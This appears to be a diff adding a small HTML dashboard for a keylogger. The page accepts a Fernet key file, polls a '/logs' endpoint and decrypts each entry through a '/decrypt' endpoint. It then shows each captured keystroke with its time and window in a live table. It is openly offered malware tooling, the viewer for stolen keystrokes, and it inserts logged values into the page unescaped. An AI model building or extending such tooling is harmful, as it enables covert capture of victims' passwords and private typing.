@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>keylogger</title>
+  <style>
+    body { font-family: monospace; padding: 20px; background: #111; color: #eee; }
+    #dropzone { border: 2px dashed #666; padding: 20px; text-align: center; margin-bottom: 20px; }
+    table { width: 100%; border-collapse: collapse; }
+    td, th { border: 1px solid #555; padding: 4px; }
+    th { background: #222; }
+  </style>
+</head>
+<body>
+  <h1>Keylogging activity</h1>
+  <div id="dropzone">drag n drop <b>key.key</b> file here</div>
+  <p id="status">verification incomplete</p>
+  <table id="logtable">
+    <thead>
+      <tr><th>Time</th><th>Window</th><th>Key</th></tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <script>
+    let fernetKey = null;
+    let lastLineCount = 0; 
+
+    document.getElementById('dropzone').addEventListener('dragover', e => e.preventDefault());
+    document.getElementById('dropzone').addEventListener('drop', async e => {
+      e.preventDefault();
+      const file = e.dataTransfer.files[0];
+      if (file) {
+        const text = await file.text();
+        fernetKey = text.trim();
+        document.getElementById('status').innerText = "key uploaded :)";
+
+        setInterval(loadLogs, 2000);
+      }
+    });
+
+    async function loadLogs() {
+      if (!fernetKey) return;
+      const resp = await fetch('/logs');
+      const raw = await resp.text();
+      if (!raw.trim()) return;
+
+      const lines = raw.trim().split("\n");
+      const tbody = document.querySelector('#logtable tbody');
+
+      const newLines = lines.slice(lastLineCount);
+      lastLineCount = lines.length;
+
+      for (let line of newLines) {
+        try {
+          const decrypted = await decryptWithPython(line, fernetKey);
+          const entry = JSON.parse(decrypted);
+          const row = `<tr>
+            <td>${entry.time}</td>
+            <td>${entry.window}</td>
+            <td>${entry.key}</td>
+          </tr>`;
+          tbody.innerHTML += row;
+        } catch (e) {
+          console.error("Error decrypting:", e);
+        }
+      }
+    }
+
+    async function decryptWithPython(ciphertext, key) {
+      const resp = await fetch('/decrypt', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ciphertext, key })
+      });
+      return await resp.text();
+    }
+  </script>
+</body>
+</html>
